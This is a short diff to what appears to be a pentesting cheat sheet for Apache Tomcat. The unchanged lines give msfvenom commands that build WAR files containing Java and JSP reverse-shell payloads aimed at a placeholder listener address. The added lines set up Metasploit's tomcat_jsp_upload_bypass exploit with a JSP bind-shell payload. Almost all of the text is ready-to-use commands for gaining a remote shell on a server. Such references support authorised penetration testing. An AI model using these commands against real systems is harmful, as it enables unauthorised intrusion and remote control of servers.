@@ -41,3 +41,9 @@ msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o revshell.wa
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o revshell.war
 ```
+
+### JSP Payload (metasploit)
+```bash
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set payload java/jsp_shell_bind_tcp
+```
